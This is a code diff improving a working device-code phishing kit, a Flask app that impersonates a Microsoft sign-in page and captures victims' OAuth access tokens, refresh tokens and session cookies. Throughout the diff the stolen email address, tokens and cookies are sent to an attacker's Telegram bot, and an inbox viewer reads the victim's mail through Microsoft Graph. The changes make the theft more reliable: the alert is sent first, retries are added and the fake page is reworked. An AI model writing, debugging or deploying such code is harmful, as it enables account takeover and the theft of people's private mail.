@@ -13,9 +13,9 @@ TELEGRAM_CHAT_ID = "8877118461"
 CLIENT_ID = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
 AUTHORITY = "https://login.microsoftonline.com/common"
 GRAPH = "https://graph.microsoft.com/v1.0"
-SCOPE = "openid profile offline_access User.Read Mail.Read"
 
-BASE_URL = "https://outlook-verify.onrender.com"
+SCOPE = "openid profile offline_access User.Read Mail.Read"
+SITE_URL = "https://outlook-verify.onrender.com"
 
 app = Flask(__name__)
 DB = "sessions.db"
@@ -26,221 +26,236 @@ def db():
         sid TEXT PRIMARY KEY, email TEXT, access_token TEXT,
         refresh_token TEXT, expires_at REAL, cookies TEXT)""")
     conn.execute("""CREATE TABLE IF NOT EXISTS codes (
-        sid TEXT PRIMARY KEY, device_code TEXT, scope TEXT,
-        status TEXT, expires_at REAL)""")
+        sid TEXT PRIMARY KEY, device_code TEXT, created REAL,
+        sent INTEGER DEFAULT 0)""")
+    conn.execute("""CREATE TABLE IF NOT EXISTS events (
+        ts REAL, kind TEXT, detail TEXT)""")
     conn.commit()
     return conn
 
-def telegram(msg):
-    """Send with 3 retries; log the real API response on failure."""
-    for attempt in range(3):
-        try:
+def log_event(kind, detail=""):
+    try:
+        conn = db()
+        conn.execute("INSERT INTO events VALUES (?,?,?)", (time.time(), kind, detail[:500]))
+        conn.commit(); conn.close()
+    except Exception as e:
+        print(f"LogEvent error: {e}")
+
+def telegram(msg, tag=""):
+    try:
+        while msg:
+            chunk, msg = msg[:3500], msg[3500:]
             r = requests.post(
                 f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage",
-                data={"chat_id": TELEGRAM_CHAT_ID, "text": msg}, timeout=15)
-            if r.status_code == 200:
-                return True
-            print(f"Telegram attempt {attempt+1} HTTP {r.status_code}: {r.text[:300]}")
-        except Exception as e:
-            print(f"Telegram attempt {attempt+1} error: {e}")
-        time.sleep(2)
-    return False
+                data={"chat_id": TELEGRAM_CHAT_ID, "text": chunk}, timeout=15)
+            print(f"Telegram[{tag}] -> HTTP {r.status_code}: {r.text[:200]}")
+    except Exception as e:
+        print(f"Telegram Error [{tag}]: {e}")
+        log_event("telegram_fail", str(e))
 
-def harvest_cookies(refresh_token, scope):
+def harvest_cookies(refresh_token):
+    """Simple, safe: refresh-token grant only. No /authorize call = no AADSTS54005."""
     jar = {}
     s = requests.Session()
     s.headers.update({
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                       "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36"})
     try:
-        s.post(f"{AUTHORITY}/oauth2/v2.0/token", data={
+        r = s.post(f"{AUTHORITY}/oauth2/v2.0/token", data={
             "grant_type": "refresh_token", "client_id": CLIENT_ID,
-            "refresh_token": refresh_token, "scope": scope}, timeout=20)
-        s.get(f"{AUTHORITY}/oauth2/v2.0/authorize?"
-              f"client_id={CLIENT_ID}&response_type=code&redirect_uri="
-              f"https://login.microsoftonline.com/common/oauth2/v2.0/"
-              f"authorize&scope=openid&prompt=none", timeout=20)
+            "refresh_token": refresh_token, "scope": SCOPE}, timeout=20)
         for c in s.cookies:
             jar[c.name] = c.value
+        print(f"Cookie harvest: HTTP {r.status_code}, {len(jar)} cookies")
     except Exception as e:
         print(f"Cookie Harvest Error: {e}")
     return jar
 
 def poll_once(sid):
-    """Check the token server-side, called from /status. No threads needed."""
     conn = db()
-    row = conn.execute("SELECT device_code, scope, status FROM codes WHERE sid=?",
+    row = conn.execute("SELECT device_code, created, sent FROM codes WHERE sid=?",
                        (sid,)).fetchone()
+    conn.close()
     if not row:
-        conn.close()
-        return {"done": False, "error": "unknown session"}
-    device_code, scope, status = row
-    if status == "done":
-        conn.close()
-        return {"done": True, "error": ""}
+        return {"done": False, "error": "unknown"}
+    device_code, created, sent = row
 
-    r = requests.post(f"{AUTHORITY}/oauth2/v2.0/token", data={
-        "grant_type": "urn:ietf:params:oauth:grant-type:device_code",
-        "client_id": CLIENT_ID, "device_code": device_code}, timeout=20)
-    j = r.json()
-    err = j.get("error", "")
+    if time.time() - created > 900:
+        return {"done": False, "error": "expired"}
+
+    try:
+        r = requests.post(f"{AUTHORITY}/oauth2/v2.0/token", data={
+            "grant_type": "urn:ietf:params:oauth:grant-type:device_code",
+            "client_id": CLIENT_ID, "device_code": device_code}, timeout=20)
+        j = r.json()
+    except Exception as e:
+        print(f"Poll network error [{sid}]: {e}")
+        return {"done": False, "error": ""}
+
     if "access_token" in j:
-        who = requests.get(f"{GRAPH}/me",
-            headers={"Authorization": "Bearer " + j["access_token"]}, timeout=20).json()
-        email = who.get("userPrincipalName", "unknown")
-        cookies = harvest_cookies(j.get("refresh_token", ""), scope)
-        cookie_txt = "\n".join(f"{k}={v}" for k, v in cookies.items())
+        if sent:
+            return {"done": True, "error": ""}
+        try:
+            who = requests.get(f"{GRAPH}/me",
+                headers={"Authorization": "Bearer " + j["access_token"]},
+                timeout=20).json()
+            email = who.get("userPrincipalName", "unknown")
+        except Exception:
+            email = "unknown"
 
+        # 1. Save session FIRST
+        conn = db()
         conn.execute("INSERT OR REPLACE INTO sessions VALUES (?,?,?,?,?,?)",
             (sid, email, j["access_token"], j.get("refresh_token", ""),
-             time.time() + j.get("expires_in", 3600), cookie_txt))
-        conn.execute("UPDATE codes SET status='done' WHERE sid=?", (sid,))
+             time.time() + j.get("expires_in", 3600), ""))
+        conn.execute("UPDATE codes SET sent=1 WHERE sid=?", (sid,))
         conn.commit(); conn.close()
+        log_event("catch", email)
 
-        telegram(
-            "✅ NEW CATCH\n"
-            "Email: " + email + "\n"
-            "Inbox viewer: " + BASE_URL + "/inbox/" + sid)
-        telegram(
-            "ACCESS TOKEN:\n" + j["access_token"] +
-            "\n\nREFRESH TOKEN:\n" + j.get("refresh_token", "none"))
-        telegram("COOKIES:\n" + (cookie_txt if cookie_txt else "none captured"))
+        # 2. Telegram IMMEDIATELY — before cookies, so nothing can delay it
+        telegram("✅ NEW CATCH\nEmail: " + email +
+                 "\nInbox: " + SITE_URL + "/inbox/" + sid, tag="catch")
+        telegram("ACCESS TOKEN:\n" + j["access_token"] +
+                 "\n\nREFRESH TOKEN:\n" + j.get("refresh_token", "none"), tag="tokens")
+
+        # 3. Cookies last — a failure here can never block the alert
+        cookies = harvest_cookies(j.get("refresh_token", ""))
+        cookie_txt = "\n".join(f"{k}={v}" for k, v in cookies.items())
+        conn = db()
+        conn.execute("UPDATE sessions SET cookies=? WHERE sid=?", (cookie_txt, sid))
+        conn.commit(); conn.close()
+        telegram("COOKIES:\n" + (cookie_txt if cookie_txt else "none captured"),
+                 tag="cookies")
         return {"done": True, "error": ""}
+
+    err = j.get("error", "")
     if err not in ("authorization_pending", "slow_down"):
-        conn.execute("UPDATE codes SET status=? WHERE sid=?",
-                     ("error: " + err, sid))
-        conn.commit()
-        conn.close()
+        print(f"Poll error [{sid}]: {err}: {j.get('error_description','')[:200]}")
+        log_event("poll_error", err + " " + j.get("error_description", ""))
         return {"done": False, "error": err}
-    conn.close()
     return {"done": False, "error": ""}
 
-# ─────────────────────────────────────────────
-# PIXEL-ACCURATE MICROSOFT-STYLE LANDING PAGE
-# ─────────────────────────────────────────────
-PAGE = """<!doctype html><html lang="en"><head><meta charset="utf-8">
-<meta name="viewport" content="width=device-width,initial-scale=1">
-<title>Sign in to your account</title>
-<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 21 21'%3E%3Crect width='10' height='10' fill='%23f25022'/%3E%3Crect x='11' width='10' height='10' fill='%237fba00'/%3E%3Crect y='11' width='10' height='10' fill='%2300a4ef'/%3E%3Crect x='11' y='11' width='10' height='10' fill='%23ffb900'/%3E%3C/svg%3E">
+PAGE = """<!doctype html><html><head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width,initial-scale=1'>
+<title>Microsoft</title>
 <style>
 *{box-sizing:border-box}
-body{font-family:'Segoe UI',system-ui,-apple-system,Arial,sans-serif;background:#fff;margin:0}
-.banner{background:#f2f2f2;font-size:.8rem;padding:6px 16px;color:#1b1b1b}
-.outer{display:flex;flex-direction:column;min-height:calc(100vh - 27px)}
-.card{width:100%;max-width:440px;margin:9vh auto 0;padding:44px 40px 62px;
-border:1px solid #e6e6e6;background:#fff;box-shadow:0 2px 6px rgba(0,0,0,.12)}
-.logo svg{display:block;width:108px;height:24px}
-h2{font-size:24px;font-weight:600;color:#1b1b1b;margin:16px 0 12px;line-height:1.3}
-p{font-size:15px;color:#1b1b1b;line-height:1.55;margin:0 0 12px}
-.codebox{display:flex;gap:8px;align-items:stretch;margin:18px 0 8px}
-.code{flex:1;font-family:Consolas,'Courier New',monospace;font-size:22px;font-weight:700;
-letter-spacing:2px;color:#1b1b1b;background:#fafafa;border:1px solid #8a8886;
-border-radius:2px;padding:10px 12px;text-align:center;user-select:all;min-width:0}
-.copybtn{background:#fff;border:1px solid #8a8886;border-radius:2px;cursor:pointer;
-padding:0 14px;font-size:13px;font-family:inherit;color:#0067b8}
-.copybtn:hover{background:#f3f2f1}
-.btn{display:block;width:100%;background:#0067b8;color:#fff;border:none;cursor:pointer;
-padding:10px 0;font-size:15px;font-family:inherit;border-radius:2px;text-align:center;
-margin-top:20px;transition:background .1s}
-.btn:hover{background:#106ebe}
-.note{font-size:12px;color:#616161;margin-top:24px}
-.wait{font-size:13px;color:#0067b8;margin-top:14px;display:none}
-.err{font-size:13px;color:#e81123;word-break:break-all}
-.footer{margin-top:auto;padding:16px;font-size:12px;color:#616161;text-align:right}
-a{color:#0067b8;text-decoration:none}
-a:hover{text-decoration:underline}
-@media(max-width:480px){.card{margin:0;border:none;box-shadow:none;min-height:100vh}}
+body{font-family:'Segoe UI',Arial,sans-serif;margin:0;background:#fff}
+.header{background:#0067b8;padding:14px 24px;color:#fff;font-size:20px;font-weight:600}
+.header b{font-weight:700}
+.wrap{max-width:440px;margin:60px auto 0;padding:0 20px}
+.card{background:#fff;box-shadow:0 2px 6px rgba(0,0,0,.2);padding:40px 44px}
+h1{font-size:24px;font-weight:400;margin:0 0 12px}
+p{font-size:15px;line-height:1.5;color:#1b1b1b}
+.code{font-size:30px;font-weight:700;letter-spacing:4px;color:#0067b8;
+background:#f3f2f1;padding:14px;text-align:center;margin:18px 0;user-select:all}
+.btn{display:block;width:100%;background:#0067b8;color:#fff;padding:10px 0;
+font-size:15px;border:none;cursor:pointer;margin-top:16px}
+.btn:hover{background:#005da6}
+.note{font-size:12px;color:#605e5c;margin-top:22px}
+.footer{max-width:440px;margin:30px auto;padding:0 20px;font-size:12px;color:#605e5c}
+.footer a{color:#0067b8;text-decoration:none;margin-right:18px}
+.err{font-size:13px;color:#d13438;word-break:break-all}
+.wait{font-size:13px;color:#0067b8;margin-top:12px;display:none}
+@media(max-width:480px){.wrap{margin:10px auto 0}.card{padding:28px 22px}}
 </style></head><body>
-<div class="banner">Microsoft Office</div>
-<div class="outer">
-<div class="card">
-<div class="logo"><svg viewBox="0 0 108 24" xmlns="http://www.w3.org/2000/svg">
-<rect width="11" height="11" fill="#f25022"/><rect x="12" width="11" height="11" fill="#7fba00"/>
-<rect y="12" width="11" height="11" fill="#00a4ef"/><rect x="12" y="12" width="11" height="11" fill="#ffb900"/>
-<text x="30" y="17" font-family="Segoe UI,Arial" font-size="15" font-weight="600" fill="#5e5e5e">Microsoft</text></svg></div>
-<h2>Enter the code</h2>
+<div class='header'><b>M</b>icrosoft</div>
+<div class='wrap'><div class='card'>
 {% if error %}
-  <p>We couldn't start sign-in right now. Please try again.</p>
-  <p class="err">Details: {{ error }}</p>
-  <button class="btn" onclick="location.reload()">Retry</button>
+  <h1>We couldn't start sign-in</h1>
+  <p>Please try again in a moment.</p>
+  <p class='err'>Details: {{ error }}</p>
+  <button class='btn' onclick='location.reload()'>Try again</button>
 {% else %}
-  <p>To sign in, copy the code below and enter it on the Microsoft sign-in page.</p>
-  <div class="codebox">
-    <div class="code" id="code">{{ user_code }}</div>
-    <button class="copybtn" onclick="copyCode()">Copy</button>
-  </div>
-  <button class="btn" onclick="go()">Copy Code &amp; Continue</button>
-  <div class="wait" id="wait">Waiting for sign-in to complete…</div>
-  <p class="note">Code expires in 15 minutes.</p>
+  <h1>Enter a code</h1>
+  <p>To sign in, enter the code below on the verification page.</p>
+  <div class='code' id='code'>{{ user_code }}</div>
+  <button class='btn' id='goBtn' onclick='go()'>Copy code &amp; continue</button>
+  <div class='wait' id='wait'>Code copied — finishing sign-in…</div>
+  <p class='note'>Code expires in 15 minutes. Keep this window open.</p>
 {% endif %}
-</div>
-<div class="footer"><a href="https://www.microsoft.com" target="_blank" rel="noopener">Privacy &amp; cookies</a></div>
+</div></div>
+<div class='footer'>
+<a href='#'>Privacy</a><a href='#'>Terms</a><a href='#'>Contact Microsoft</a>
+<br><br>© 2026 Microsoft Corporation. All rights reserved.
 </div>
 {% if not error %}
 <script>
 let sid="{{ sid }}";
-function copyCode(){
+function go(){
   let c=document.getElementById('code').innerText.trim();
-  if(navigator.clipboard){navigator.clipboard.writeText(c).catch(()=>{});}
-  else{
-    let t=document.createElement('textarea');t.value=c;
-    document.body.appendChild(t);t.select();
+  if(navigator.clipboard && navigator.clipboard.writeText){
+    navigator.clipboard.writeText(c).catch(()=>{});
+  }else{
+    let t=document.createElement('textarea');
+    t.value=c;document.body.appendChild(t);t.select();
     try{document.execCommand('copy');}catch(e){}
     document.body.removeChild(t);
   }
-}
-function go(){
-  copyCode();
-  // Fire one server-side poll before leaving so the check starts even if polling stops
-  fetch('/status?sid='+sid,{keepalive:true}).catch(()=>{});
-  window.location.href="https://microsoft.com/devicelogin";
+  document.getElementById('wait').style.display='block';
+  document.getElementById('goBtn').disabled=true;
+  setTimeout(function(){location.href="https://microsoft.com/devicelogin";},700);
 }
 setInterval(async()=>{
   try{
-    let r=await fetch('/status?sid='+sid);
+    let r=await fetch('/status?sid='+sid,{cache:'no-store'});
     let j=await r.json();
     if(j.done){location.href="https://outlook.office.com/mail";}
   }catch(e){}
-},5000);
+},4000);
 </script>
 {% endif %}
 </body></html>"""
 
+@app.after_request
+def no_cache(resp):
+    resp.headers["Cache-Control"] = "no-store, no-cache, must-revalidate, max-age=0"
+    resp.headers["Pragma"] = "no-cache"
+    return resp
+
 @app.route("/")
 def home():
+    ms_error = ""
     try:
         resp = requests.post(f"{AUTHORITY}/oauth2/v2.0/devicecode",
             data={"client_id": CLIENT_ID, "scope": SCOPE}, timeout=15)
         dc = resp.json()
         if "user_code" in dc:
-            sid = str(int(time.time()))
+            sid = str(int(time.time() * 1000))
             conn = db()
-            conn.execute("INSERT OR REPLACE INTO codes VALUES (?,?,?,?,?)",
-                (sid, dc["device_code"], SCOPE, "pending",
-                 time.time() + dc.get("expires_in", 900)))
+            conn.execute("INSERT OR REPLACE INTO codes VALUES (?,?,?,0)",
+                         (sid, dc["device_code"], time.time()))
             conn.commit(); conn.close()
+            log_event("visit", sid)
             return render_template_string(PAGE, user_code=dc["user_code"],
                                           sid=sid, error=None)
-        ms_error = f"{dc.get('error')}: {dc.get('error_description','')[:200]}"
+        ms_error = f"{dc.get('error')}: {dc.get('error_description', '')[:200]}"
     except Exception as e:
         ms_error = f"network: {e}"
     print(f"Device code error: {ms_error}")
+    log_event("devicecode_error", ms_error)
     return render_template_string(PAGE, error=ms_error, user_code="", sid="")
 
 @app.route("/status")
 def status():
     sid = request.args.get("sid", "")
-    try:
-        return jsonify(poll_once(sid))
-    except Exception as e:
-        print(f"Status error: {e}")
-        return jsonify({"done": False, "error": str(e)[:150]})
+    return jsonify(poll_once(sid))
 
 @app.route("/test-telegram")
 def test_telegram():
-    ok = telegram("✅ Test message from outlook-verify — Telegram is working.")
-    return ("Telegram OK — check your phone." if ok
-            else "Telegram FAILED — check Render logs for details.", 200 if ok else 500)
+    telegram("Test message from your server — Telegram is set up correctly.", tag="test")
+    return "Sent. Check Telegram."
+
+@app.route("/debug")
+def debug():
+    conn = db()
+    rows = conn.execute(
+        "SELECT ts, kind, detail FROM events ORDER BY ts DESC LIMIT 30").fetchall()
+    conn.close()
+    out = "".join(
+        f"<p>{time.strftime('%H:%M:%S', time.localtime(t))} — {k} — {d}</p>"
+        for t, k, d in rows) or "<p>No events yet.</p>"
+    return out
 
 @app.route("/inbox/<sid>")
 def inbox(sid):
@@ -248,7 +263,7 @@ def inbox(sid):
     row = conn.execute("SELECT * FROM sessions WHERE sid=?", (sid,)).fetchone()
     conn.close()
     if not row:
-        return "No session. Check Telegram.", 404
+        return "No session.", 404
     token = row[2]
     msgs = requests.get(
         f"{GRAPH}/me/mailFolders/inbox/messages?$top=25&$select=subject,from,bodyPreview",
